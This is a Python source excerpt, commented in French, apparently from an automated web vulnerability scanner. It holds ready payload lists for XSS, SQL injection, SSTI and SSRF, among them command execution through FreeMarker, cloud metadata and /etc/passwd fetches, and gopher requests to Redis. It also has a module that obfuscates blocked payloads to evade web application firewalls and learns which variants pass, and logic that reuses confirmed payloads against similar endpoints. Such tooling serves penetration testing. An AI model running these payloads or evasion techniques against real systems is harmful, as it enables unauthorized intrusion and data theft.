            "'-alert(1)-'",
        ],
        _InjectionContext.HEADER_VALUE: [
            "<script>alert(1)</script>",
            "%0d%0aX-Injected:%20yes",  # CRLF dans header
        ],
    }

    # ── Payloads SQLi par contexte ─────────────────────────────────────────────
    _SQLI_PAYLOADS: dict[str, list[str]] = {
        _InjectionContext.JSON_VALUE: [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1 OR 1=1--",
            "1' AND SLEEP(5)--",
            "1; SELECT SLEEP(5)--",
            "') OR ('1'='1",
        ],
        _InjectionContext.QUERY_PARAM: [
            "' OR '1'='1'--",
            "1 AND 1=1--",
            "1 AND SLEEP(5)--",
            "1' AND '1'='1",
            "1 UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",  # Error-based column count
        ],
        _InjectionContext.PATH_SEGMENT: [
            "1'",
            "1%27",
            "1 AND 1=1",
            "1%20AND%201%3D1",
        ],
        _InjectionContext.XML_NODE: [
            "' OR '1'='1",
            "]]><inject/>",
            "<!--#exec cmd='id'-->",
        ],
    }

    # ── Payloads SSTI par contexte ─────────────────────────────────────────────
    _SSTI_PAYLOADS: dict[str, list[str]] = {
        _InjectionContext.JSON_VALUE: [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ],
        _InjectionContext.QUERY_PARAM: [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{7*'7'}}",    # Jinja2 vs Twig fingerprint
            "{%raw%}{{7*7}}{%endraw%}",
            "*{7*7}",       # Spring SpEL
        ],
        _InjectionContext.PATH_SEGMENT: [
            "{{7*7}}",
            "%7B%7B7*7%7D%7D",
        ],
        _InjectionContext.HEADER_VALUE: [
            "{{7*7}}",
            "${7*7}",
        ],
    }

    # ── Payloads SSRF par contexte ─────────────────────────────────────────────
    _SSRF_PAYLOADS: dict[str, list[str]] = {
        _InjectionContext.QUERY_PARAM: [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://localhost/",
            "dict://127.0.0.1:11211/",
            "gopher://127.0.0.1:6379/_INFO",
            "file:///etc/passwd",
        ],
        _InjectionContext.JSON_VALUE: [
            '"http://169.254.169.254/latest/meta-data/"',
            '"http://127.0.0.1/"',
            '"file:///etc/passwd"',
        ],
    }

    _VULN_MAP: dict[str, dict] = {
        "xss":  _XSS_PAYLOADS,
        "sqli": _SQLI_PAYLOADS,
        "ssti": _SSTI_PAYLOADS,
        "ssrf": _SSRF_PAYLOADS,
    }

    # ── Détection de contexte ──────────────────────────────────────────────────

    def detect_context(
        self,
        response_body: str,
        sentinel: str,
        content_type: str = "",
        response_headers: dict | None = None,
    ) -> str:
        """
        Détecte le contexte d'injection en cherchant le sentinel dans la réponse.

        Returns: une constante _InjectionContext.*
        """
        ct = content_type.lower()
        body = response_body

        if sentinel not in body and sentinel not in (response_headers or {}).values():
            return _InjectionContext.UNKNOWN

        # JSON — sentinel dans un body JSON
        if "application/json" in ct or body.lstrip().startswith(("{", "[")):
            if f'"{sentinel}"' in body or f': {sentinel}' in body or f':{sentinel}' in body:
                return _InjectionContext.JSON_VALUE

        # XML / SOAP
        if "xml" in ct or body.lstrip().startswith("<?xml"):
            return _InjectionContext.XML_NODE

        # Dans un attribut HTML
        import re as _re2
        if _re2.search(rf'=["\']?[^"\'<>]*{_re2.escape(sentinel)}[^"\'<>]*["\']?', body):
            return _InjectionContext.HTML_ATTR

        # Dans un header de réponse
        if response_headers:
            for v in response_headers.values():
                if sentinel in str(v):
                    return _InjectionContext.HEADER_VALUE

        # Dans un segment de path (redirect Location: ...)
        if response_headers and sentinel in response_headers.get("location", ""):
            return _InjectionContext.PATH_SEGMENT

        # Fallback : query param (réflexion dans body HTML standard)
        return _InjectionContext.QUERY_PARAM

    # ── Génération de payloads ──────────────────────────────────────────────────

    def mutate(
        self,
        base_value: str,
        context: str,
        vuln_type: str,
        max_payloads: int = 12,
    ) -> list[str]:
        """
        Retourne des payloads adaptés au contexte pour le type de vuln donné.

        Args:
            base_value:   valeur originale du paramètre (ex: "1", "test")
            context:      contexte détecté via detect_context()
            vuln_type:    "xss" | "sqli" | "ssti" | "ssrf"
            max_payloads: limite du nombre de payloads retournés

        Returns:
            liste de payloads prêts à injecter (substitution directe de base_value)
        """
        vuln_map = self._VULN_MAP.get(vuln_type.lower(), {})
        # Payloads spécifiques au contexte, fallback QUERY_PARAM
        payloads = vuln_map.get(context, vuln_map.get(_InjectionContext.QUERY_PARAM, []))
        return payloads[:max_payloads]

    def mutate_for_all_vulns(
        self,
        base_value: str,
        context: str,
    ) -> dict[str, list[str]]:
        """Retourne un dict {vuln_type: [payloads]} pour tous les types supportés."""
        return {
            vtype: self.mutate(base_value, context, vtype)
            for vtype in self._VULN_MAP
        }


# ─────────────────────────── SmartRetryOracle ───────────────────────────────

class SmartRetryOracle:
    """
    v5.20 — Retry intelligent avec mutation d'encodage + mémoire WAF.
    Nouveautés :
      - record_variant_success() pour mémoriser les variantes qui passent
      - Variantes ordonnées par efficacité passée sur ce type de WAF
      - Jitter randomisé dans l'ordre (moins prévisible)
    v5.17 — Retry intelligent avec mutation d'encodage quand un payload est bloqué par WAF.

    Quand un module reçoit un 403/406/429 ou détecte un WAF trigger sur un payload,
    SmartRetryOracle génère automatiquement des variantes encodées/obfusquées du même
    payload pour contourner les signatures WAF superficielles.

    Stratégies d'encodage (par ordre de priorité) :
      1. Double URL-encoding               %3C → %253C
      2. Unicode escape (\\uXXXX)           < → \\u003c
      3. HTML entities                      < → &#60; ou &lt;
      4. Mixed case                         <ScRiPt>
      5. Null bytes                         <scri%00pt>
      6. Comment injection (SQL/HTML)       SE/**/LECT
      7. Newline injection                  %0A entre tokens
      8. Tab substitution                   SELECT\\t
      9. Base64 encoded value (pour JSON)
      10. UTF-8 overlong encoding

    Usage dans un module :
        oracle = SmartRetryOracle()
        for variant in oracle.variants(blocked_payload, context="sqli"):
            resp = await req.get(url, params={"id": variant})
            if not heuristic.is_waf_block(resp):
                break  # variant passé
    """

    # Caractères communs dans les payloads → substitutions WAF-bypass
    _HTML_ENTITIES: dict[str, list[str]] = {
        "<":  ["&#60;", "&lt;", "\\u003c", "%3C", "%253C", "\uff1c"],
        ">":  ["&#62;", "&gt;", "\\u003e", "%3E", "%253E", "\uff1e"],
        "'":  ["&#39;", "&apos;", "\\u0027", "%27", "%2527", "\u2019"],
        '"':  ["&#34;", "&quot;", "\\u0022", "%22", "%2522"],
        " ":  ["+", "%20", "%09", "/**/", "%0a", "%0d"],
        "=":  ["%3D", "\\u003d"],
        "/":  ["%2F", "\\u002f", "%252F"],
    }

    _SQL_COMMENT_PATTERNS: list[tuple[str, str]] = [
        ("SELECT", "SE/**/LECT"),
        ("UNION",  "UN/**/ION"),
        ("INSERT", "INS/**/ERT"),
        ("UPDATE", "UP/**/DATE"),
        ("DELETE", "DE/**/LETE"),
        ("WHERE",  "WH/**/ERE"),
        ("FROM",   "FR/**/OM"),
        ("OR",     "O/**/R"),
        ("AND",    "AN/**/D"),
        ("SLEEP",  "SL/**/EEP"),
    ]

    def __init__(self) -> None:
        # v5.20 — Mémoire des variantes efficaces par signature WAF
        self._waf_memory: dict[str, list[str]] = {}
        self._variant_success: dict[str, int] = {}

    def record_variant_success(self, payload: str, variant: str, waf_sig: str = "") -> None:
        """v5.20 — Enregistre qu'une variante a passé le WAF."""
        fn = self._identify_transform(payload, variant)
        if fn:
            self._variant_success[fn] = self._variant_success.get(fn, 0) + 1
            if waf_sig:
                waf_list = self._waf_memory.setdefault(waf_sig, [])
                if fn not in waf_list:
                    waf_list.insert(0, fn)

    def _identify_transform(self, original: str, variant: str) -> str | None:
        """Identifie quelle transformation a produit ce variant."""
        try:
            if variant == self._double_url_encode(original):   return "double_url_encode"
            if variant == self._mixed_case(original):          return "mixed_case"
            if variant == self._sql_comments(original):        return "sql_comments"
            if variant == self._html_entities(original):       return "html_entities"
            if variant == self._unicode_escape(original):      return "unicode_escape"
            if variant == self._null_byte_inject(original):    return "null_byte"
            if variant == self._newline_inject(original):      return "newline"
            if variant == original.replace(" ", "	"):         return "tab_sub"
        except Exception:
            pass
        return None

    def variants(
        self,
        payload: str,
        context: str = _InjectionContext.QUERY_PARAM,
        max_variants: int = 8,
        waf_sig: str = "",
    ) -> list[str]:
        """
        v5.20 — Génère des variantes encodées, ordonnées par efficacité passée.
        Génère des variantes encodées d'un payload pour contourner les WAF.

        Args:
            payload:      payload bloqué original
            context:      contexte d'injection (influence le choix d'encodage)
            max_variants: nombre max de variantes retournées

        Returns:
            liste de variantes (sans doublons), payload original non inclus
        """
        variants: list[str] = []

        # 1. URL double-encoding sur les chars spéciaux
        v = self._double_url_encode(payload)
        if v != payload:
            variants.append(v)

        # 2. Mixed case
        if any(c.isalpha() for c in payload):
            variants.append(self._mixed_case(payload))

        # 3. SQL comment injection (si contexte SQL)
        if context in ("sqli", _InjectionContext.QUERY_PARAM, _InjectionContext.JSON_VALUE):
            v = self._sql_comments(payload)
            if v != payload:
                variants.append(v)

        # 4. HTML entities (si contexte HTML)
        if context in (_InjectionContext.HTML_ATTR, _InjectionContext.QUERY_PARAM):
            v = self._html_entities(payload)
            if v != payload:
                variants.append(v)

        # 5. Unicode escape
        v = self._unicode_escape(payload)
        if v != payload:
            variants.append(v)

        # 6. Null byte avant char clé
        v = self._null_byte_inject(payload)
        if v != payload:
            variants.append(v)

        # 7. Newline injection entre tokens
        v = self._newline_inject(payload)
        if v != payload:
            variants.append(v)

        # 8. Tab substitution pour les espaces
        v = payload.replace(" ", "\t")
        if v != payload:
            variants.append(v)

        # Déduplique en conservant l'ordre
        seen: set[str] = set()
        result: list[str] = []
        for v in variants:
            if v not in seen and v != payload:
                seen.add(v)
                result.append(v)

        return result[:max_variants]

    # ── Helpers d'encodage ────────────────────────────────────────────────────

    @staticmethod
    def _double_url_encode(payload: str) -> str:
        import urllib.parse
        # Encode une fois, puis encode les % en %25
        single = urllib.parse.quote(payload, safe="")
        return single.replace("%", "%25")

    @staticmethod
    def _mixed_case(payload: str) -> str:
        result = []
        for i, c in enumerate(payload):
            result.append(c.upper() if i % 2 == 0 else c.lower())
        return "".join(result)

    @staticmethod
    def _sql_comments(payload: str) -> str:
        result = payload.upper()
        for word, replacement in SmartRetryOracle._SQL_COMMENT_PATTERNS:
            result = result.replace(word, replacement)
        return result

    @classmethod
    def _html_entities(cls, payload: str) -> str:
        result = payload
        for char, entities in cls._HTML_ENTITIES.items():
            if char in result and entities:
                result = result.replace(char, entities[0], 1)
        return result

    @staticmethod
    def _unicode_escape(payload: str) -> str:
        result = []
        for c in payload:
            if ord(c) > 127 or c in "<>\"'":
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def _null_byte_inject(payload: str) -> str:
        # Insère %00 avant le premier char spécial
        for special in ["<", "'", '"', " "]:
            if special in payload:
                return payload.replace(special, f"%00{special}", 1)
        return payload

    @staticmethod
    def _newline_inject(payload: str) -> str:
        # Remplace les espaces par %0a dans les contextes header/SQL
        return payload.replace(" ", "%0a")


# ─────────────────────────── PatternMemory ──────────────────────────────────

class PatternMemory:
    """
    v5.17 — Mémoire des patterns d'attaque qui ont fonctionné pendant le scan.

    Enregistre les payloads confirmés (avec leur contexte, vuln type, module)
    et les propose en PRIORITÉ pour les endpoints similaires qui n'ont pas encore
    été testés.

    Logique :
      - Un payload SQLi time-based a fonctionné sur /api/users?id= → mémoriser
        ce payload ET ce type de paramètre ("id", contexte QUERY_PARAM, "sqli")
      - Quand un autre module teste /api/orders?id= → PatternMemory suggère ce
        payload en premier, avant les payloads génériques

    Usage dans un module :
        memory = engine.pattern_memory  # instance partagée via le Engine
        # Enregistrer un succès
        memory.record_success(
            vuln_type="sqli", param="id", payload="1 AND SLEEP(5)--",
            context=_InjectionContext.QUERY_PARAM, endpoint_prefix="/api/users"
        )
        # Récupérer les suggestions pour un nouveau endpoint
        suggestions = memory.suggest_payloads(
            vuln_type="sqli", param="id", context=_InjectionContext.QUERY_PARAM,
            endpoint_prefix="/api/orders"
        )
        # → [("1 AND SLEEP(5)--", 0.95), ...]  # (payload, score de confiance)
    """

    @dataclasses.dataclass
    class _SuccessRecord:
        vuln_type: str
        param: str
        payload: str
        context: str
        endpoint_prefix: str   # ex: "/api/users"
        hits: int = 1          # nombre de confirmations
        confidence: float = 0.8

    # Normalisation canonique des noms de paramètres
    # user_id, userId, user-id, UserID → tous → "user_id"
    @staticmethod
    def _canonical_param(p: str) -> str:
        import re
        # camelCase → snake_case
        s = re.sub(r'([A-Z])', r'_', p).lower().strip('_')
        # Remplacer tirets et espaces par underscore
        s = re.sub(r'[\-\s\.]+', '_', s)
        # Supprimer les caractères non alphanumériques
        s = re.sub(r'[^a-z0-9_]', '', s)
        return s or p.lower()

    def __init__(self) -> None:
        # Clé → LISTE de records : (vuln_type, canonical_param, context) → [SuccessRecord]
        # v5.20 : multi-payload (plusieurs payloads peuvent marcher pour le même contexte)
        self._records: dict[tuple[str,str,str], list["PatternMemory._SuccessRecord"]] = {}
        self._prefix_vulns: dict[str, set[str]] = {}
        # Timestamp du dernier enregistrement par clé (pour le decay)
        self._last_record_ts: dict[tuple[str,str,str], float] = {}

    def record_success(
        self,
        vuln_type: str,
        param: str,
        payload: str,
        context: str,
        endpoint_prefix: str,
        confidence: float = 0.85,
    ) -> None:
        """
        v5.20 — Enregistre un payload confirmé.
        Multi-payload : plusieurs payloads différents par contexte sont mémorisés.
        Normalisation canonique des noms de paramètres (userId == user_id == user-id).
        """
        import time as _t
        key = (vuln_type.lower(), self._canonical_param(param), context)
        now = _t.monotonic()

        existing = self._records.get(key, [])
        # Chercher si ce payload exact existe déjà
        for rec in existing:
            if rec.payload == payload:
                rec.hits += 1
                rec.confidence = min(1.0, rec.confidence + 0.05)
                rec.endpoint_prefix = endpoint_prefix  # mettre à jour le prefix
                self._last_record_ts[key] = now
                self._prefix_vulns.setdefault(endpoint_prefix, set()).add(vuln_type.lower())
                return

        # Nouveau payload pour ce contexte : l'ajouter à la liste
        new_rec = self._SuccessRecord(
            vuln_type=vuln_type.lower(),
            param=self._canonical_param(param),
            payload=payload,
            context=context,
            endpoint_prefix=endpoint_prefix,
            confidence=confidence,
        )
        existing.append(new_rec)
        # Limiter à 10 payloads par contexte (garder les meilleurs)
        if len(existing) > 10:
            existing.sort(key=lambda r: -(r.confidence * r.hits))
            existing[:] = existing[:10]
        self._records[key] = existing
        self._last_record_ts[key] = now
        self._prefix_vulns.setdefault(endpoint_prefix, set()).add(vuln_type.lower())

    def _decayed_confidence(self, key: tuple, base_conf: float) -> float:
        """
        v5.20 — Décroissance temporelle de la confiance.
        Un payload qui a marché il y a longtemps est légèrement moins prioritaire
        (les WAF et configs peuvent changer en cours de scan).
        Décroissance de 5% par 60 secondes sans réconfirmation.
        """
        import time as _t
        ts = self._last_record_ts.get(key, _t.monotonic())
        age_s = _t.monotonic() - ts
        decay = max(0.7, 1.0 - (age_s / 60.0) * 0.05)
        return base_conf * decay

    def suggest_payloads(
        self,
        vuln_type: str,
        param: str,
        context: str,
        endpoint_prefix: str = "",
        top_n: int = 5,
    ) -> list[tuple[str, float]]:
        """
        v5.20 — Retourne les payloads connus efficaces pour ce contexte.
        Normalisation canonique des params, multi-payload, decay temporel.
        """
        results: list[tuple[str, float]] = []
        vt = vuln_type.lower()
        canon = self._canonical_param(param)

        for (rec_vt, rec_param, rec_ctx), rec_list in self._records.items():
            if rec_vt != vt:
                continue

            for rec in rec_list:
                score = self._decayed_confidence((rec_vt, rec_param, rec_ctx), rec.confidence)

                # Bonus selon la similarité param + contexte
                if rec_param == canon and rec_ctx == context:
                    score = min(1.0, score + 0.15)
                elif rec_param == canon:
                    score *= 0.80
                elif rec_ctx == context:
                    score *= 0.55
                else:
                    continue

                # Bonus prefix similaire
                if endpoint_prefix and rec.endpoint_prefix:
                    if (endpoint_prefix.startswith(rec.endpoint_prefix) or
                            rec.endpoint_prefix.startswith(endpoint_prefix)):
                        score = min(1.0, score + 0.10)

                # Bonus selon les hits accumulés (payload validé plusieurs fois)
                score = min(1.0, score + min(0.10, rec.hits * 0.02))

                results.append((rec.payload, round(score, 3)))

        # Trier par score, dédupliquer
        seen: set[str] = set()
        deduped: list[tuple[str, float]] = []
        for payload, score in sorted(results, key=lambda x: -x[1]):
            if payload not in seen:
                seen.add(payload)
                deduped.append((payload, score))
        return deduped[:top_n]

    def hot_prefixes(self, min_vulns: int = 2) -> list[str]:
        """
        Retourne les prefixes d'endpoints où ≥ min_vulns types de vulns ont été trouvés.
        Utile pour l'Engine pour booster la priorité de ces zones.
        """
        return [
            prefix for prefix, vulns in self._prefix_vulns.items()
            if len(vulns) >= min_vulns
        ]

    def summary(self) -> dict:
        """Résumé des patterns mémorisés — utile pour le rapport final."""
        by_vuln: dict[str, int] = {}
        for (vt, _, _) in self._records:
            by_vuln[vt] = by_vuln.get(vt, 0) + 1
        return {
            "total_patterns": len(self._records),
            "by_vuln_type": by_vuln,
            "hot_prefixes": self.hot_prefixes(),
        }


# ═══════════════════════════════════════════════════════════════════════════════
# v5.18 — Intelligence améliorée : FlowGraphAnalyzer, SemanticParamClassifier,
#          ResponseEntropy, AdaptiveRateController, GraphPayloadChain
# ═══════════════════════════════════════════════════════════════════════════════

import math
import hashlib
import time
import random
from collections import defaultdict
from urllib.parse import urlparse, parse_qs
from typing import NamedTuple


# ─────────────────────────── SemanticParamClassifier ────────────────────────

class ParamRole:
    """Rôles sémantiques des paramètres HTTP — guide la sélection de payloads."""
    ID          = "id"           # id, user_id, item_id → IDOR, SQLi
    URL         = "url"          # url, src, href, redirect → SSRF, Open Redirect
    PATH        = "path"         # path, file, dir, filename → LFI, Path Traversal
    TEMPLATE    = "template"     # template, tpl, view, layout → SSTI
    CMD         = "cmd"          # cmd, exec, command, run → CMDi
    TOKEN       = "token"        # token, jwt, key, auth → Auth Bypass, JWT
    CALLBACK    = "callback"     # callback, jsonp, cb → Open Redirect, XSS
    QUERY       = "query"        # q, search, keyword → SQLi, XSS
    EMAIL       = "email"        # email, mail → Account takeover
    DATA        = "data"         # data, payload, body → Deserial, XXE
    LIMIT       = "limit"        # limit, count, page → Business Logic, IDOR
    FORMAT      = "format"       # format, type, output → SSTI, XXE
    UNKNOWN     = "unknown"


class SemanticParamClassifier:
    """
    v5.18 — Classifie les paramètres HTTP par rôle sémantique pour
    orienter la sélection de payloads et prioriser les modules.

    Au lieu de tester tous les paramètres de façon uniforme, le scanner
    sait maintenant que `file=` est une cible LFI prioritaire,
    `url=` → SSRF, `template=` → SSTI, etc.

    Usage :
        clf = SemanticParamClassifier()
        roles = clf.classify_params(["user_id", "redirect_url", "tpl"])
        # → {"user_id": "id", "redirect_url": "url", "tpl": "template"}
        modules = clf.recommended_modules_for_params(roles)
        # → ["idor", "sqli", "ssrf", "open_redirect", "ssti"]
    """

    # Patterns de noms → rôle sémantique
    # Chaque entrée : (set de substrings lowercase, rôle)
    _RULES: list[tuple[list[str], str]] = [
        # IDs numériques / ressources
        (["id", "uid", "uuid", "user_id", "item_id", "order_id",
          "account_id", "record_id", "object_id", "entity_id",
          "product_id", "doc_id", "post_id", "comment_id",
          "customer_id", "invoice_id", "session_id", "pid"],             ParamRole.ID),

        # URLs et redirections
        (["url", "redirect", "next", "return", "goto", "dest",
          "destination", "ref", "referer", "href", "src", "source",
          "link", "target", "uri", "location", "forward"],               ParamRole.URL),

        # Chemins de fichiers
        (["path", "file", "filename", "filepath", "dir", "directory",
          "folder", "document", "page", "include", "load", "read",
          "fetch", "resource", "attachment", "download"],                 ParamRole.PATH),

        # Templates / vues
        (["template", "tpl", "tmpl", "view", "layout", "theme",
          "skin", "render", "format", "engine", "style"],                 ParamRole.TEMPLATE),

        # Commandes
        (["cmd", "exec", "command", "run", "execute", "process",
          "action", "op", "operation", "shell", "ping", "host"],          ParamRole.CMD),

        # Tokens / auth
        (["token", "jwt", "auth", "key", "apikey", "api_key",
          "access_key", "secret", "password", "passwd", "credential",
          "bearer", "cookie", "session", "nonce"],                         ParamRole.TOKEN),

        # Callbacks / JSONP
        (["callback", "jsonp", "cb", "func", "function",
          "handler", "on", "success", "error"],                            ParamRole.CALLBACK),

        # Recherche / query
        (["q", "query", "search", "keyword", "term", "filter",
          "find", "lookup", "where", "condition", "expression"],           ParamRole.QUERY),

        # Email / identité
        (["email", "mail", "username", "login", "user",
          "account", "handle", "identity"],                                ParamRole.EMAIL),

        # Données sérialisées
        (["data", "payload", "body", "content", "object",
          "xml", "json", "serialized", "encoded", "raw"],                  ParamRole.DATA),

        # Pagination / limites
        (["limit", "count", "page", "per_page", "size",
          "offset", "start", "end", "max", "min", "num"],                 ParamRole.LIMIT),

        # Format de sortie
        (["format", "type", "output", "ext", "encoding",
          "mime", "accept", "content_type", "mode"],                       ParamRole.FORMAT),
    ]

    # Rôle → modules recommandés (ordonnés par pertinence)
    _ROLE_TO_MODULES: dict[str, list[str]] = {
        ParamRole.ID:        ["idor", "sqli", "nosql_injection", "auth_bypass"],
        ParamRole.URL:       ["ssrf", "open_redirect", "open_redirect_chain", "cors"],
        ParamRole.PATH:      ["lfi", "path_traversal", "ssrf", "xxe"],
        ParamRole.TEMPLATE:  ["ssti", "xss", "lfi"],
        ParamRole.CMD:       ["cmdi", "ssti", "lfi"],
        ParamRole.TOKEN:     ["jwt", "jwt_advanced", "auth_bypass", "oauth_misconfig"],
        ParamRole.CALLBACK:  ["xss", "dom_xss", "open_redirect", "cors"],
        ParamRole.QUERY:     ["sqli", "nosql_injection", "xss", "ssti"],
        ParamRole.EMAIL:     ["xss", "sqli", "auth_bypass"],
        ParamRole.DATA:      ["deserialization", "xxe", "ssrf", "nosql_injection"],
        ParamRole.LIMIT:     ["business_logic", "idor", "sqli"],
        ParamRole.FORMAT:    ["ssti", "xxe", "lfi", "open_redirect"],
        ParamRole.UNKNOWN:   ["xss", "sqli", "ssti"],
    }

    def classify_param(self, param_name: str) -> str:
        """
        v5.20 — Classifie un paramètre par rôle sémantique.
        Améliorations vs v5.18 :
          - Correspondance exacte prioritaire (évite 'id' qui matchait dans 'radio_button_id')
          - Substring match uniquement sur des mots complets (séparés par _, -, [, ])
          - Minimum 3 caractères pour le keyword (évite 'q' qui matchait 'query_string')
        """
        import re
        name_lower = param_name.lower().strip("[]")
        # Segmenter le nom en mots (split sur _, -, [, ], chiffres)
        words = set(re.split(r'[_\-\[\]0-9]+', name_lower)) - {'', 'the', 'a', 'an'}

        # 1. Correspondance exacte du nom complet
        for keywords, role in self._RULES:
            if name_lower in keywords:
                return role

        # 2. Un des mots du param est un keyword exact
        for keywords, role in self._RULES:
            kw_set = set(keywords)
            if words & kw_set:
                return role

        # 3. Substring : le keyword est contenu dans le nom (mais ≥ 3 chars et mot complet)
        for keywords, role in self._RULES:
            for kw in keywords:
                if len(kw) >= 3 and kw in name_lower:
                    # Vérifier que c'est un mot complet (pas un fragment)
                    # ex: "id" ne doit pas matcher "grid" ou "radio_id_button"
                    # mais doit matcher "user_id" ou "order_id"
                    pattern = rf'(?:^|[_\-\[\]]){re.escape(kw)}(?:[_\-\[\]]|$)'
                    if re.search(pattern, name_lower) or name_lower == kw:
                        return role

        return ParamRole.UNKNOWN

    def classify_params(self, params: list[str]) -> dict[str, str]:
        """Classifie une liste de paramètres → {param_name: role}."""
        return {p: self.classify_param(p) for p in params}

    def recommended_modules_for_params(
        self,
        roles: dict[str, str],
        top_n: int = 6,
    ) -> list[str]:
        """
        Retourne les modules recommandés pour un ensemble de rôles de paramètres,
        ordonnés par fréquence (les modules qui couvrent le plus de rôles en premier).
        """
        score: dict[str, int] = defaultdict(int)
        for role in set(roles.values()):
            for i, module in enumerate(self._ROLE_TO_MODULES.get(role, [])):
                score[module] += max(1, 5 - i)  # priorité décroissante
        return sorted(score, key=lambda m: -score[m])[:top_n]

    def high_value_params(self, params: list[str]) -> list[str]:
        """
        Retourne les paramètres les plus intéressants d'un point de vue sécurité
        (ceux dont le rôle est le plus critique).
        """
        HIGH_VALUE_ROLES = {
            ParamRole.URL, ParamRole.PATH, ParamRole.CMD,
            ParamRole.TEMPLATE, ParamRole.DATA, ParamRole.TOKEN,
        }
        classified = self.classify_params(params)
        high = [p for p, role in classified.items() if role in HIGH_VALUE_ROLES]
        # Retourner triés par criticité de rôle
        role_priority = list(HIGH_VALUE_ROLES)
        high.sort(key=lambda p: role_priority.index(classified[p])
                  if classified[p] in role_priority else 99)
        return high


# ─────────────────────────── ResponseEntropyAnalyzer ────────────────────────

class EntropyResult(NamedTuple):
    entropy: float          # Shannon entropy (0-8 bits)
    is_binary: bool         # contenu binaire probable
    is_encrypted: bool      # données chiffrées/compressées (entropie > 7.5)
    is_structured: bool     # JSON/XML/HTML structuré (entropie 3.5-6)
    lang_hint: str          # "json" | "xml" | "html" | "sql" | "binary" | "text"
    token_density: float    # densité de tokens intéressants (credentials, paths...)


class ResponseEntropyAnalyzer:
    """
    v5.18 — Analyse l'entropie des réponses HTTP pour détecter :
      - Données chiffrées / compressées dans la réponse (entropie haute)
      - Leaks de données structurées (JSON secret, XML inattendu)
      - Réponses binary-like vs textuelles
      - Densité de tokens intéressants (mots-clés credentials, paths système...)

    Utilisé par les modules pour qualifier les réponses et détecter des
    anomalies subtiles (ex: un endpoint qui retourne de l'entropie haute
    sur un param particulier = possible oracle de chiffrement).

    Usage :
        analyzer = ResponseEntropyAnalyzer()
        result = analyzer.analyze("{'user':'admin','token':'eyJ...'}")
        if result.is_encrypted:
            # Possible oracle crypto
        if result.token_density > 0.3:
            # Beaucoup de données sensibles dans la réponse
    """

    # Tokens qui indiquent des données sensibles
    _SENSITIVE_TOKENS: list[str] = [
        "password", "passwd", "secret", "token", "api_key", "apikey",
        "private_key", "access_key", "auth", "credential", "session",
        "root:", "admin:", "BEGIN PRIVATE", "AKIA", "eyJ",  # JWT prefix
        "/etc/passwd", "/etc/shadow", "C:\\Windows",
        "mysql://", "postgres://", "mongodb://", "redis://",
        "AWS_SECRET", "DATABASE_URL",
    ]

    def analyze(self, body: str, content_type: str = "") -> EntropyResult:
        """
        Analyse une réponse HTTP et retourne ses métriques d'entropie.
        """
        if not body:
            return EntropyResult(0.0, False, False, False, "text", 0.0)

        sample = body[:8192]  # limiter à 8KB pour la perf
        entropy = self._shannon_entropy(sample)
        is_binary = self._detect_binary(sample)
        is_encrypted = entropy > 7.2 and not self._is_base64_json(sample)
        is_structured = (
            3.0 <= entropy <= 6.5
            and not is_binary
            and any(m in sample[:200] for m in ["{", "<", "["])
        )
        lang_hint = self._detect_language(sample, content_type)
        token_density = self._token_density(sample)

        return EntropyResult(
            entropy=round(entropy, 3),
            is_binary=is_binary,
            is_encrypted=is_encrypted,
            is_structured=is_structured,
            lang_hint=lang_hint,
            token_density=round(token_density, 3),
        )

    def compare_entropy(self, baseline_body: str, probed_body: str) -> dict:
        """
        Compare l'entropie entre deux réponses.
        Un changement d'entropie significatif peut indiquer une vuln blind.

        Returns:
            dict avec delta_entropy, is_significant, direction ("higher"|"lower")
        """
        base = self.analyze(baseline_body)
        probed = self.analyze(probed_body)
        delta = probed.entropy - base.entropy
        return {
            "base_entropy": base.entropy,
            "probed_entropy": probed.entropy,
            "delta_entropy": round(delta, 3),
            "is_significant": abs(delta) > 0.8,
            "direction": "higher" if delta > 0 else "lower",
            "new_sensitive_tokens": probed.token_density > base.token_density + 0.1,
        }

    @staticmethod
    def _shannon_entropy(text: str) -> float:
        """Calcule l'entropie de Shannon en bits."""
        if not text:
            return 0.0
        freq: dict[str, int] = defaultdict(int)
        for ch in text:
            freq[ch] += 1
        n = len(text)
        entropy = 0.0
        for count in freq.values():
            p = count / n
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy

    @staticmethod
    def _detect_binary(text: str) -> bool:
        """Détecte si le contenu est binaire (> 5% de bytes non-imprimables)."""
        non_printable = sum(1 for c in text[:1024] if ord(c) < 32 and c not in "\n\r\t")
        return non_printable / max(len(text[:1024]), 1) > 0.05

    @staticmethod
    def _is_base64_json(text: str) -> bool:
        """Heuristique: détecte un JWT ou base64-encoded JSON (entropie haute normale)."""
        return text.strip().startswith("eyJ") or (
            all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                for c in text.strip()[:64])
        )

    @staticmethod
    def _detect_language(text: str, content_type: str) -> str:
        ct = content_type.lower()
        head = text.lstrip()[:200]
        if "json" in ct or head.startswith(("{", "[")):
            return "json"
        if "xml" in ct or head.startswith(("<?xml", "<soap", "<SOAP")):
            return "xml"
        if "html" in ct or "<html" in head.lower():
            return "html"
        if any(kw in text[:500].upper() for kw in ["SELECT ", "INSERT ", "UPDATE ", "CREATE TABLE"]):
            return "sql"
        return "binary" if ResponseEntropyAnalyzer._detect_binary(text) else "text"

    def _token_density(self, text: str) -> float:
        """Calcule la densité de tokens sensibles dans la réponse (0-1)."""
        if not text:
            return 0.0
        text_lower = text.lower()
        hits = sum(1 for tok in self._SENSITIVE_TOKENS if tok.lower() in text_lower)
        return min(1.0, hits / max(len(self._SENSITIVE_TOKENS) * 0.3, 1))


# ─────────────────────────── FlowGraphAnalyzer ──────────────────────────────

@dataclass
class FlowEdge:
    """Arête du graphe de flux : un lien entre deux endpoints."""
    src_url: str
    dst_url: str
    edge_type: str   # "redirect" | "form_action" | "js_link" | "api_chain"
    param_carried: list[str]  # params qui "voyagent" d'un endpoint à l'autre


@dataclass
class AttackPath:
    """Chemin d'attaque multi-étapes dans le graphe de flux."""
    steps: list[str]          # séquence d'URLs
    edge_types: list[str]     # types de transitions
    risk_score: float         # 0-1
